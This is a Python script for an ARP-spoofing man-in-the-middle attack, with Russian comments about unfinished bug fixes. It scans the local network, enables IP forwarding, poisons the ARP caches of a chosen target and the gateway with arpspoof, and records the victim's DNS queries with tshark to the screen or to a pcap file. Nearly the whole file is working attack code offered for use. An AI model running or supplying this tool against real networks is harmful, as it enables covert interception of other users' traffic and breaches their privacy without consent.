from subprocess import run, Popen
from datetime import datetime
from time import sleep

def mainFunc():

	try:
		scanHOST = run("timeout --signal=SIGKILL 5s arp-scan --localnet", 
			shell = True, capture_output = True, text = True)
	except KeyboardInterrupt:
		print("Stopping...")
		raise SystemExit

	if scanHOST.returncode == 0:
		print(scanHOST.stdout)

	else:
		print(scanHOST.stderr)
		raise SystemExit

	defaultGATEWAY = run("timeout --signal=SIGKILL 2s ip route", 
		shell = True, capture_output = True, text = True)

	malicious_pattern = [';', '&', '&&', '|', '$', '-', '(', ')']
	mode_pattern = ['screen', 'file']

	GATEWAY_ = defaultGATEWAY.stdout.split(" ")[2]
	INTERFACE_ = defaultGATEWAY.stdout.split(" ")[4]

	try:
		TARGET_ = str(input("IP address && mode --> "))
	except KeyboardInterrupt:
		print("Stopping...")
		raise SystemExit

	conv = list(TARGET_)
	modeV = TARGET_.split(' ')

	if not TARGET_:
		print("Empty input!")
		raise SystemExit
	else:
		for detection in range(len(TARGET_)):
			if conv[detection] in malicious_pattern:
				print("Was Detected Malicious symbol", conv[detection])
				raise SystemExit
			else:
				pass

	if str(open("/proc/sys/net/ipv4/ip_forward", 'r').read()[0]) == '0':
		open("/proc/sys/net/ipv4/ip_forward", 'w').write('1')
	else:
		pass

	run("arpspoof -i "+INTERFACE_+" -t "+GATEWAY_+" "+str(TARGET_.split(" ")[0])+" 2> /dev/null 1> /dev/null &", 
		shell = True, capture_output = False, text = True)

	run("arpspoof -i "+INTERFACE_+" -t "+str(TARGET_.split(" ")[0])+" "+GATEWAY_+" 2> /dev/null 1> /dev/null &", 
		shell = True, capture_output = False, text = True)

	clock_ = str(datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))

	try:
		if modeV[1] in mode_pattern:
			if modeV[1] == mode_pattern[0]:
				try:
					tshark_screen =  Popen(['tshark', '-i', INTERFACE_, '-Y', 'dns'])
					tshark_screen.wait()

				except KeyboardInterrupt:
					print("Stopping...")

					Popen(['killall', 'arpspoof'])

					tshark_screen.terminate()

					open('/proc/sys/net/ipv4/ip_forward', 'w').write('0')

					sleep(4)
					raise SystemExit
			else:
				try:
					tshark_file = Popen(["tshark", "-i", INTERFACE_, "-f", "port 53", "-w", "dns"+clock_+".pcap"])
					tshark_file.wait()

				except KeyboardInterrupt:
					print("Stopping")

					Popen(['killall', 'arpspoof'])

					tshark_file.terminate()

					open("/proc/sys/net/ipv4/ip_forward", 'w').write("0")

					sleep(4)
					raise SystemExit

# tshark: A capture filter was specified both with "-f" and with additional command-line arguments. Ошибка
		else:
			print("Unknown command!")

			Popen(["killall", "arpspoof"])
			raise SystemExit

	except IndexError:
		print("Command without mode argument!")
		raise SystemExit

mainFunc()

#Добавить завершение предыдущих процессов, проверить пересылку пакетов там была ошибка с перезаписью...
